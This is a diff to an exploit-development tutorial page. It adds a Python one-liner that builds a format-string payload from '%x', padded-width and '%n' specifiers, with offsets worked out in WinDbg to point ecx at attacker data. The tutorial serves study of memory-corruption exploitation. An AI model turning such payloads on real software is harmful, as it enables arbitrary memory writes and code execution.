@@ -133,7 +133,7 @@
     "keywords": ["ExploitDev","ReverseEng"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "1018"
+    "wordCount": "1032"
   }
   </script>
 
@@ -805,7 +805,8 @@ Evaluate expression: 3096 = 00000c18
 0:000&gt; ? 0n345014 - 0n3096
 Evaluate expression: 341918 = 0005379e
 </code></pre><p>Running the python command again and feeding the program, we can see we successfully pointed ecx to our payload address and ecx is pointing to our 0x42424242 (BBBB).</p>
-<p>As a challenge you can try to move forward and find bad chars, replace the 0x41414141 with actual something like spawning a calculator.
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&#34;print(&#39;A&#39;*300 + &#39;</span><span class="si">%x</span><span class="s2">&#39;*161 + &#39;</span><span class="si">%.343506x</span><span class="s2">&#39; * 3 + &#39;</span><span class="si">%.341918x</span><span class="s2">&#39; + &#39;%n&#39;+ &#39;B&#39;*4)&#34;</span>
+</span></span></code></pre></div><p>As a challenge you can try to move forward and find bad chars, replace the 0x41414141 with actual something like spawning a calculator.
 You have to replace eax with  return adddress.</p>
 <figure><img src="/image/challenge_fmt_specifier_ecx_03.png" width="700" height="400">
 </figure>
